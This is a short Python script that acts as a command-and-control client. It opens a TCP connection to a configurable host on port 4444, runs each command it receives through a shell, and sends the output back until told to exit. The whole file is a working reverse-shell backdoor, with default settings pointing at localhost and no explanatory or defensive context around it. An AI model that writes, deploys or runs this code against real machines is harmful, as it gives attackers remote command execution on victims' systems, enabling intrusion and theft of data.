import socket
import subprocess

def connect_to_c2(host='127.0.0.1', port=4444):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            print(f"[+] Connecting to C2 at {host}:{port}")
            s.connect((host, port))
            print("[+] Connected. Waiting for command...")

            while True:
                command = s.recv(1024).decode()
                if command.lower() in ('exit', 'quit'):
                    print("[*] Received exit command. Closing connection.")
                    break

                try:
                    output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
                except subprocess.CalledProcessError as e:
                    output = e.output

                s.sendall(output or b'[+] Command executed but no output.')

    except ConnectionRefusedError:
        print("[-] Connection failed. C2 server may not be running.")
    except Exception as e:
        print(f"[-] Error: {e}")

if __name__ == "__main__":
    connect_to_c2()
